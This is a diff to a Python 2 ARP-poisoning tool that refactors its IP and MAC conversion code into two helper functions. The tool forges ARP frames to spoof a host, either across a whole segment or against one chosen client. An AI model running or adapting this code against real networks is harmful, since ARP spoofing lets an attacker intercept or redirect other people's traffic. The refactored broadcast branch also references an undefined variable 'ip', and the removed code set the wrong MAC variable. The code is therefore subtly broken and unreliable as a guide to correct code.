@@ -43,6 +43,13 @@ def poison(interface, src_mac, src_ip, dst_mac, dst_ip):
 		s.send(ethernet + arp_payload + tail)
 		time.sleep(SLEEP_TIME)
 
+def iptol(ip):
+	sip = ip.split(".")
+	return ''.join("%0.2X" % int(i) for i in sip).decode('hex')
+	
+def mactol(mac):
+	return mac.replace(":", "").decode('hex')
+
 def main():
 	usage = "usage: %prog [options]"
 	parser = OptionParser(usage)
@@ -61,26 +68,12 @@ def main():
 	#sending a broadcast arp poison
 	elif(options.broadcast and options.spoofed_ip and options.source_mac):
 		print "Arp poisoning segment"
-		ip = options.spoofed_ip.split(".")
-		src_ip = ''.join("%0.2X" % int(i) for i in ip).decode('hex')
-		src_mac = options.source_mac.replace(":", "").decode('hex')
-		
-		poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
+		poison(options.interface, mactol(options.source_mac), iptol(ip), "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
 	
 	#sending a unicast arp poison
 	elif(not options.broadcast and options.spoofed_ip and options.source_mac and options.target_mac and options.target_ip):
 		print "Arp poisoning client"
-		sip = options.spoofed_ip.split(".")
-		src_ip = ''.join("%0.2X" % int(i) for i in sip).decode('hex')
-
-		src_mac = options.source_mac.replace(":", "").decode('hex')
-
-		dip = options.target_ip.split(".")
-		dst_ip = ''.join("%0.2X" % int(i) for i in dip).decode('hex')
-
-		src_mac = options.target_mac.replace(":", "").decode('hex')		
-
-		poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)
+		poison(options.interface, mactol(options.source_mac), iptol(options.spoofed_ip), mactol(options.target_mac), iptol(options.target_ip))
 
 	#print menue
 	else:
